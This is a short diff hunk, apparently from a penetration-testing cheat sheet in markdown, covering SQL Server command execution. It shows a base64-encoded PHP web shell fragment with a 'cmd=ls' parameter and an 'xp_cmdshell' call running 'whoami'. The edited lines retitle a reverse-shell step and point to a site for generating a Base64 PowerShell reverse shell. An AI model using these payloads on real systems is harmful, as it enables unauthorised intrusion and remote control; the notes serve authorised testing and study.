@@ -347,8 +347,8 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     RECONFIGURE;
     EXECUTE xp_cmdshell 'whoami';  
     ```
-  - Blind reverse shell
-    - Generate Base64 in kali
+  - Bind reverse shell
+    - Generate Base64 in kali or https://www.revshells.com/ (PowerShell #3 Base64)  
       ```
       pwsh
 
